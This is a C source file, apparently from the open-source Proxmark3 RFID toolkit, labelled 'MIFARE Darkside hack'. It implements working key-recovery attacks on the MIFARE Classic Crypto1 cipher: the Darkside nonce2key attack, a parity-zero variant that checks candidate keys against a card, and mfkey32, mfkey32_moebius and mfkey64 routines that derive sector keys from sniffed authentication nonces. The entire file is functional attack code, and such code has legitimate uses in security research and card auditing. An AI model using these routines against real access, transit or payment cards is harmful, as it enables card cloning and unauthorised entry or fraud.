//-----------------------------------------------------------------------------
// Merlok - June 2011
// Roel - Dec 2009
// Unknown author
//
// This code is licensed to you under the terms of the GNU GPL, version 2 or,
// at your option, any later version. See the LICENSE.txt file for the text of
// the license.
//-----------------------------------------------------------------------------
// MIFARE Darkside hack
//-----------------------------------------------------------------------------
#include "nonce2key.h"

// called with a uint8_t *x  array
#define LE32TOH(x)  (uint32_t)( ( (x)[3]<<24) | ( (x)[2]<<16) | ( (x)[1]<<8) | (x)[0]);

int nonce2key(uint32_t uid, uint32_t nt, uint32_t nr, uint64_t par_info, uint64_t ks_info, uint64_t * key) {
	struct Crypto1State *state;
	uint32_t i, pos, rr = 0, nr_diff;
	byte_t bt, ks3x[8], par[8][8];

	// Reset the last three significant bits of the reader nonce
	nr &= 0xffffff1f;
  
	PrintAndLog("uid(%08x) nt(%08x) par(%016" PRIx64") ks(%016" PRIx64") nr(%08x)", uid, nt, par_info, ks_info, nr);

	for ( pos = 0; pos < 8; pos++ ) {
		ks3x[7-pos] = (ks_info >> (pos*8)) & 0x0f;
		bt = (par_info >> (pos*8)) & 0xff;

		for ( i = 0; i < 8; i++) {
			par[7-pos][i] = (bt >> i) & 0x01;
		}
	}

	PrintAndLog("+----+--------+---+-----+---------------+");
	PrintAndLog("|diff|{nr}    |ks3|ks3^5|parity         |");
	PrintAndLog("+----+--------+---+-----+---------------+");
	for ( i = 0; i < 8; i++) {
		nr_diff = nr | i << 5;

		PrintAndLog("| %02x |%08x| %01x |  %01x  |%01x,%01x,%01x,%01x,%01x,%01x,%01x,%01x|",
			i << 5, nr_diff, ks3x[i], ks3x[i]^5,
			par[i][0], par[i][1], par[i][2], par[i][3],
			par[i][4], par[i][5], par[i][6], par[i][7]);

	}
	PrintAndLog("+----+--------+---+-----+---------------+");

	uint64_t t1 = msclock();

	state = lfsr_common_prefix(nr, rr, ks3x, par);
	lfsr_rollback_word(state, uid ^ nt, 0);
	crypto1_get_lfsr(state, key);
	crypto1_destroy(state);

	t1 = msclock() - t1;
	PrintAndLog("Time in nonce2key: %.0f ticks", (float)t1/1000.0);
	return 0;
}

int compar_intA(const void * a, const void * b) {
	if (*(int64_t*)b == *(int64_t*)a) return 0;
	if (*(int64_t*)b > *(int64_t*)a) return 1;
	return -1;
}

// call when PAR == 0,  special attack?  It seems to need two calls.  with same uid, block, keytype
int nonce2key_ex(uint8_t blockno, uint8_t keytype, uint32_t uid, uint32_t nt, uint32_t nr, uint64_t ks_info, uint64_t * key) {

	struct Crypto1State *state;
	uint32_t i, pos, key_count;
	uint8_t ks3x[8];
	uint64_t key_recovered;
	int64_t *state_s;
	static uint8_t last_blockno;
	static uint8_t last_keytype;
	static uint32_t last_uid;
	static int64_t *last_keylist;
  
	if (last_uid != uid &&
		last_blockno != blockno &&
		last_keytype != keytype &&
		last_keylist != NULL)
	{
		free(last_keylist);
		last_keylist = NULL;
	}
	last_uid = uid;
	last_blockno = blockno;
	last_keytype = keytype;

	// Reset the last three significant bits of the reader nonce
	nr &= 0xffffff1f;
 
	// split keystream into array
	for (pos=0; pos<8; pos++) {
		ks3x[7-pos] = (ks_info >> (pos*8)) & 0x0f;
	}
 
	// find possible states for this keystream
	state = lfsr_common_prefix_ex(nr, ks3x);

	if (!state) {
		PrintAndLog("Failed getting states");
		return 1;
	}
	
	state_s = (int64_t*)state;
	
	uint32_t xored = uid ^ nt;
	
	for (i = 0; (state) && ((state + i)->odd != -1); i++) {
		lfsr_rollback_word(state + i, xored, 0);
		crypto1_get_lfsr(state + i, &key_recovered);
		*(state_s + i) = key_recovered;
	}

	qsort(state_s, i, sizeof(int64_t), compar_intA);
	*(state_s + i) = -1;
	
	// first call to this function.  clear all other stuff and set new found states.
	if (last_keylist == NULL) {
		free(last_keylist);
		last_keylist = state_s;
		PrintAndLog("parity is all zero, testing special attack. First call, this attack needs at least two calls. Hold on...");		
		PrintAndLog("uid(%08x) nt(%08x) ks(%016" PRIx64") nr(%08x)", uid, nt, ks_info, nr);
		return 1;
	}

	PrintAndLog("uid(%08x) nt(%08x) ks(%016" PRIx64") nr(%08x)", uid, nt, ks_info, nr);
		
	//Create the intersection:
	int64_t *p1, *p2, *p3;
	p1 = p3 = last_keylist; 
	p2 = state_s;
		
	while ( *p1 != -1 && *p2 != -1 ) {
		if (compar_intA(p1, p2) == 0) {
			PrintAndLog("p1:%" PRIx64" p2:%" PRIx64" p3:%" PRIx64" key:%012" PRIx64
				, (uint64_t)(p1-last_keylist)
				, (uint64_t)(p2-state_s)
				, (uint64_t)(p3-last_keylist)
				, *p1
			);
			*p3++ = *p1++;
			p2++;
		}
		else {
			while (compar_intA(p1, p2) == -1) ++p1;
			while (compar_intA(p1, p2) == 1) ++p2;
		}
	}
	key_count = p3 - last_keylist;
	PrintAndLog("key_count: %d", key_count);
	if ( key_count == 0 ){
		free(state);
		state = NULL;
		return 0;
	}
	
	uint8_t retval = 1;
	// Validate all key candidates with testing each of them with mfCheckKeys
	uint8_t keyBlock[6] = {0,0,0,0,0,0};
	uint64_t key64;
	for (i = 0; i < key_count; i++) {
		key64 = *(last_keylist + i);
		num_to_bytes(key64, 6, keyBlock);
		key64 = 0;
		if (!mfCheckKeys(blockno, keytype, false, 1, keyBlock, &key64)) {
			*key = key64;
			retval = 0;
			goto out;
		}
	}
	
out:
	free(last_keylist);
	last_keylist = NULL;
	free(state);
	state = NULL;
	return retval;
}

// 32 bit recover key from 2 nonces, with same nonce
bool tryMfk32(nonces_t data, uint64_t *outputkey, bool verbose) {
	struct Crypto1State *s,*t;
	uint64_t outkey = 0;
	uint64_t key=0;     // recovered key
	uint32_t uid     = data.cuid;
	uint32_t nt      = data.nonce;  // first tag challenge (nonce)
	uint32_t nr0_enc = data.nr;  // first encrypted reader challenge
	uint32_t ar0_enc = data.ar;  // first encrypted reader response
	uint32_t nr1_enc = data.nr2; // second encrypted reader challenge
	uint32_t ar1_enc = data.ar2; // second encrypted reader response
	bool isSuccess = false;
	uint8_t counter = 0;
	
	clock_t t1 = clock();
	uint32_t p64 = prng_successor(nt, 64);
		
	if ( verbose ) {
		PrintAndLog("Recovering key for:");
		PrintAndLog("    uid: %08x",uid);
		PrintAndLog("     nt: %08x",nt);
		PrintAndLog(" {nr_0}: %08x",nr0_enc);
		PrintAndLog(" {ar_0}: %08x",ar0_enc);
		PrintAndLog(" {nr_1}: %08x",nr1_enc);
		PrintAndLog(" {ar_1}: %08x",ar1_enc);
		PrintAndLog("\nLFSR succesors of the tag challenge:");
		PrintAndLog("  nt': %08x", p64);
		PrintAndLog(" nt'': %08x", prng_successor(p64, 32));
	}
	
	s = lfsr_recovery32(ar0_enc ^ p64, 0);
  
	for(t = s; t->odd | t->even; ++t) {
		lfsr_rollback_word(t, 0, 0);
		lfsr_rollback_word(t, nr0_enc, 1);
		lfsr_rollback_word(t, uid ^ nt, 0);
		crypto1_get_lfsr(t, &key);
		crypto1_word(t, uid ^ nt, 0);
		crypto1_word(t, nr1_enc, 1);
		if (ar1_enc == (crypto1_word(t, 0, 0) ^ p64)) {
			outkey = key;
			++counter;
			if (counter==20) break;
		}
	}
 	isSuccess = (counter > 0);
	t1 = clock() - t1;
	if ( t1 > 0 ) PrintAndLog("Time in mfkey32: %.0f ticks  - possible keys %d", (float)t1, counter);

	*outputkey = ( isSuccess ) ? outkey : 0;	
	crypto1_destroy(s);
	return isSuccess;
}

bool tryMfk32_moebius(nonces_t data, uint64_t *outputkey, bool verbose) {
	struct Crypto1State *s, *t;
	uint64_t outkey  = 0;
	uint64_t key 	 = 0;			     // recovered key
	uint32_t uid     = data.cuid;
	uint32_t nt0     = data.nonce;  // first tag challenge (nonce)
	uint32_t nr0_enc = data.nr;  // first encrypted reader challenge
	uint32_t ar0_enc = data.ar; // first encrypted reader response
	//uint32_t uid1    = LE32TOH(data+16);
	uint32_t nt1     = data.nonce2; // second tag challenge (nonce)
	uint32_t nr1_enc = data.nr2; // second encrypted reader challenge
	uint32_t ar1_enc = data.ar2; // second encrypted reader response	
	bool isSuccess = false;
	int counter = 0;

	clock_t t1 = clock();

	uint32_t p640 = prng_successor(nt0, 64);
	uint32_t p641 = prng_successor(nt1, 64);
	
	if (verbose) {
		PrintAndLog("Recovering key for:");
		PrintAndLog("    uid: %08x", uid);
		PrintAndLog("   nt_0: %08x", nt0);
		PrintAndLog(" {nr_0}: %08x", nr0_enc);
		PrintAndLog(" {ar_0}: %08x", ar0_enc);
		PrintAndLog("   nt_1: %08x", nt1);
		PrintAndLog(" {nr_1}: %08x", nr1_enc);
		PrintAndLog(" {ar_1}: %08x", ar1_enc);
		PrintAndLog("\nLFSR succesors of the tag challenge:");
		PrintAndLog("  nt': %08x", p640);
		PrintAndLog(" nt'': %08x", prng_successor(p640, 32));
	}
	
	s = lfsr_recovery32(ar0_enc ^ p640, 0);
  
	for(t = s; t->odd | t->even; ++t) {
		lfsr_rollback_word(t, 0, 0);
		lfsr_rollback_word(t, nr0_enc, 1);
		lfsr_rollback_word(t, uid ^ nt0, 0);
		crypto1_get_lfsr(t, &key);
		
		crypto1_word(t, uid ^ nt1, 0);
		crypto1_word(t, nr1_enc, 1);
		if (ar1_enc == (crypto1_word(t, 0, 0) ^ p641)) {
			outkey=key;
			++counter;
			if (counter==20) break;
		}
	}
    isSuccess	= (counter > 0);
	t1 = clock() - t1;
	if (verbose) {
		if ( t1 > 0 ) PrintAndLog("Time in mfkey32_moebius: %.0f ticks  - possible keys %d", (float)t1, counter);
	}
	*outputkey = ( isSuccess ) ? outkey : 0;
	crypto1_destroy(s);
	return isSuccess;
}

// 64 bit recover key from a full authentication. (sniffed)
int tryMfk64_ex(uint8_t *data, uint64_t *outputkey){
	uint32_t uid    = LE32TOH(data);
	uint32_t nt     = LE32TOH(data+4);  // tag challenge
	uint32_t nr_enc = LE32TOH(data+8);  // encrypted reader challenge
	uint32_t ar_enc = LE32TOH(data+12); // encrypted reader response	
	uint32_t at_enc = LE32TOH(data+16);	// encrypted tag response
	return tryMfk64(uid, nt, nr_enc, ar_enc, at_enc, outputkey);
}

int tryMfk64(uint32_t uid, uint32_t nt, uint32_t nr_enc, uint32_t ar_enc, uint32_t at_enc, uint64_t *outputkey){
	uint64_t key = 0;		// recovered key
	uint32_t ks2;     		// keystream used to encrypt reader response
	uint32_t ks3;     		// keystream used to encrypt tag response
	struct Crypto1State *revstate;
	
	PrintAndLog("Enter mfkey64");
	clock_t t1 = clock();
	
	// Extract the keystream from the messages
	ks2 = ar_enc ^ prng_successor(nt, 64);
	ks3 = at_enc ^ prng_successor(nt, 96);
	revstate = lfsr_recovery64(ks2, ks3);
	lfsr_rollback_word(revstate, 0, 0);
	lfsr_rollback_word(revstate, 0, 0);
	lfsr_rollback_word(revstate, nr_enc, 1);
	lfsr_rollback_word(revstate, uid ^ nt, 0);
	crypto1_get_lfsr(revstate, &key);

	PrintAndLog("Found Key: [%012" PRIx64 "]", key);
	t1 = clock() - t1;
	if ( t1 > 0 ) PrintAndLog("Time in mfkey64: %.0f ticks", (float)t1);

	*outputkey = key;
	crypto1_destroy(revstate);
	return 0;
}
